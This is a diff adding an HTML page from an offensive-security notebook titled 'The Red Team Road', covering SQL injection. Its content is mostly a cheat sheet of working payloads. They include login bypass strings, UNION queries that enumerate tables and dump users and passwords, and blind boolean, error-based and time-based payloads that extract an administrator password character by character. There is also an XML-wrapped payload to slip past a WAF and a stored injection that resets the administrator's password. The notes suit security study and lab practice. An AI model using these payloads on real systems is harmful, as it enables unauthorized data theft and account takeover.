@@ -1,0 +1,349 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>SQL Injection - The Red Team Road</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="WebCacheDeception.html"><strong aria-hidden="true">1.</strong> Web Cache Deception</a></li><li class="chapter-item expanded "><a href="GraphQL.html"><strong aria-hidden="true">2.</strong> GraphQL Exploitation</a></li><li class="chapter-item expanded "><a href="InsecureDeserialisation.html"><strong aria-hidden="true">3.</strong> InsecureDeserialisation</a></li><li class="chapter-item expanded "><a href="OS command injection.html"><strong aria-hidden="true">4.</strong> OS Command Injection</a></li><li class="chapter-item expanded "><a href="requestSmuggling.html"><strong aria-hidden="true">5.</strong> Request Smuggling</a></li><li class="chapter-item expanded "><a href="SQLi.html" class="active"><strong aria-hidden="true">6.</strong> SQL Injection</a></li><li class="chapter-item expanded "><a href="tricks.html"><strong aria-hidden="true">7.</strong> Tips & Tricks</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">The Red Team Road</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h2 id="sql-injection"><a class="header" href="#sql-injection">SQL injection</a></h2>
+<ul>
+<li>SQLi vulnerabilities can allow an attacker to modify or delete data, compromise the underlying server or even perform <code>denial of service</code> attacks.</li>
+</ul>
+<h3 id="detection"><a class="header" href="#detection">Detection</a></h3>
+<ul>
+<li><code>'</code>, <code>OR 1=1</code>, <code>OR 1=2</code>, <code>time based payloads</code>, <code>OAST payloads</code></li>
+</ul>
+<h3 id="common-injection-points"><a class="header" href="#common-injection-points">Common injection points</a></h3>
+<ul>
+<li>
+<p>SELECT * from Where <strong>SQLi</strong></p>
+</li>
+<li>
+<p>UPDATE set x=1 where <strong>SQLi</strong></p>
+</li>
+<li>
+<p>INSERT into x values (<strong>SQLi</strong>)</p>
+</li>
+<li>
+<p>SELECT <strong>SQLi</strong> from <strong>SQLi</strong> ORDER BY <strong>SQLi</strong></p>
+</li>
+<li>
+<p>Ways to exploit login: username: <code>admin'--</code> or password=<code>pass'+OR+1=1--</code></p>
+</li>
+</ul>
+<h3 id="sql-injection-union-attacks"><a class="header" href="#sql-injection-union-attacks">SQL injection UNION attacks</a></h3>
+<ul>
+<li>
+<p><code>EMBER MULTIPLE SELECT STATEMENTS</code></p>
+</li>
+<li>
+<p><strong>EX: SELECT A,B, FROM TABLE1 UNION SELECT C,D FROM TABLE2</strong></p>
+</li>
+<li>
+<p>This needs <code>same nr of columns</code>, and <code>compatible types of columns</code></p>
+</li>
+<li>
+<p>STEPS:</p>
+<ul>
+<li>determine nr of columns
+<ul>
+<li><code>ORDER BY n</code> until it fails</li>
+<li><code>UNION SELECT NULL, NULL, NULL....(FROM DUAL -- FOR ORACLE)</code>until it succeeds and adds a null column</li>
+</ul>
+</li>
+<li>determine the types
+<ul>
+<li><code>UNION SELECT 'a', NULL, NULL....(FROM DUAL -- FOR ORACLE)</code>until it succeeds and adds a null column</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>COMBINE MULTIPLE COLUMNS</code> : <code>SELECT USERNAME || '-' || PASSWORD FROM TABLE</code>(IN ORACLE)</p>
+</li>
+<li>
+<h3 id="how-to-inspect-the-database-tables-and-properties"><a class="header" href="#how-to-inspect-the-database-tables-and-properties">How to inspect the database tables and properties</a></h3>
+<ul>
+<li><code>SELECT @@VERSION</code><strong>MYSQL</strong>, <code>SELECT * FROM v$version</code> <strong>ORACLE</strong>, <code>SELECT version()</code> <strong>PostgreSQL</strong></li>
+<li><code>SELECT * FROM information_schema.tables</code> or <code>.columns</code></li>
+<li>ex STEP1: category=Gifts' UNION SELECT table_name,NULL from information_schema.tables</li>
+<li>ex STEP2: category=Gifts' UNION SELECT column_name,NULL from information_schema.columns where table_name='TABLENAME FOUND AT STEP 1'</li>
+<li>ex STEP3: category=Gifts' UNION SELECT column1,column2 from 'TABLENAME FOUND AT STEP 1' -&gt; to get the data</li>
+</ul>
+</li>
+</ul>
+<h3 id="blind-sql-injections"><a class="header" href="#blind-sql-injections">Blind SQL injections</a></h3>
+<ul>
+<li><code>Cookies like TrackingId=jhkahkjdlsahlda9</code>can also be an injection point!</li>
+<li>Analyse the difference in behaviour for <code>'AND'1'='1</code> and for <code>'AND'1'='2</code> (ex: Welcome back message!)</li>
+<li>DETERMINE DATA ONE STEP AT A TIME
+- use <code>SUBSTRING(data, start, length)</code> for this
+- ex: <code>TrackingId=t5gh9WYA3E8wgTlF'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='§a§</code></li>
+</ul>
+<h3 id="error-based-sql-injection-blind"><a class="header" href="#error-based-sql-injection-blind">Error-based SQL injection (BLIND)</a></h3>
+<ul>
+<li>In case boolean SQLi doesn't have an indication of success visible in the application response, you turn to Error-based SQL injection and hope that unhandeld SQL errors will cause a difference in the response.</li>
+<li>Induce an error as an indication of success, or have the data returned into error messages -&gt; visible SQLi.</li>
+<li>TEST PAYLOAD: <code>xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END) = 'a</code></li>
+<li>EXPLOIT PAYLOAD: <code>xyz' AND (SELECT CASE WHEN (username='admin' and substring(password, 1, 1)='a') THEN 1/0 ELSE 'a' END) = 'a</code></li>
+<li><strong>Verbose error messages</strong>:
+<ul>
+<li>CAST() to int to force a select result to generate an error with the output of the select.</li>
+<li><code>CAST((SELECT example_column FROM example_table) AS int)</code> -&gt; <code>ERROR: invalid input syntax for type integer: "Example data"</code></li>
+<li>PAYLOAD: <code>TrackingId=' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--</code></li>
+</ul>
+</li>
+<li><strong>Time based BLIND SQL injection</strong>
+<ul>
+<li>if errors are handled in code, then your next idea is time based</li>
+<li>These happen if the SQL is handles sinchrounously and if you add a delay in the sql query it should DELAY also the HTTP response (<strong>inefficient if done async</strong>)</li>
+<li>PAYLOAD: <code>'%3b(SELECT CASE WHEN ((SELECT SUBSTRING(password,{i},1) from users where username='administrator')='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="blind-sql-out-of-band-techinqueoast"><a class="header" href="#blind-sql-out-of-band-techinqueoast">Blind SQL Out-of-band techinque(OAST)</a></h3>
+<ul>
+<li>What if the SQL query is handled <code>asynchronously</code>? Then no more time based attacks...</li>
+<li>You need to trigger <code>OUT OF BAND interactions</code> to a system that you control.(DNS lookups)</li>
+<li><code>Use Burp Collaborator for this!</code></li>
+<li>If you identify that a DNS lookup happened to your domain, then you can append to the url the output of any query directly and you get them in the DNS query.</li>
+</ul>
+<h3 id="xml-encoded-sqli"><a class="header" href="#xml-encoded-sqli">XML encoded SQLi</a></h3>
+<ul>
+<li>You can encode your payload in any format: JSON, XML</li>
+<li>Sometimes there is a <code>WAF</code> to bypass -&gt; you can use Hackvertor from BurpSUite extensions, and wrap your payload in a xml tag to bypass it</li>
+<li>ex: `</li>
+</ul>
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>
+<p>1
+</productId><storeId>&lt;@dec_entities&gt;1 UNION SELECT username||'+'||password from users LIMIT 5&lt;@/dec_entities&gt;</storeId></stockCheck>`</p>
+<ul>
+<li>
+<p>The <code>&lt;@dec_entities&gt;</code> tag is used to encode the sqli payload like this behind the scenes:</p>
+<p></productId><storeId>1 UNION SELECT username||'+'||password from users LIMIT 5</storeId></stockCheck></p>
+</li>
+</ul>
+<h2 id="second-order-sql-injections--stored-sqli"><a class="header" href="#second-order-sql-injections--stored-sqli">Second order SQL injections = STORED SQli</a></h2>
+<ul>
+<li>ex: create a username like: <code>badguy';update users set password='letmein' where user='administrator'</code> -&gt; trigger the SQLi in a later HTTP request</li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="requestSmuggling.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="tricks.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="requestSmuggling.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="tricks.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
